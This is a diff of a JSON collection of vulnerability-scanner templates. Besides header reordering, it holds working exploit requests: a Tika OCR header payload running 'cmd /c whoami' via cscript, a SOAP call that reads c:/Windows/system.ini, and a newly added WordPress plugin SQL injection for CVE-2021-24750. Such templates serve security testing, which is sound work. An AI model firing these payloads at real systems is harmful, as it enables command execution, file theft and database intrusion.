@@ -6006,11 +6006,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10244,9 +10244,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -12559,10 +12559,25 @@
       ]
     },
     {
+      "id": "CVE-2021-24750",
+      "info": {
+        "name": "WP Visitor Statistics (Real Time Traffic) WordPress plugin before 4.8 SQLI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5('CVE-2021-24750'),4--%20%22%7D HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24997",
       "info": {
         "name": "CVE-2021-24997",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
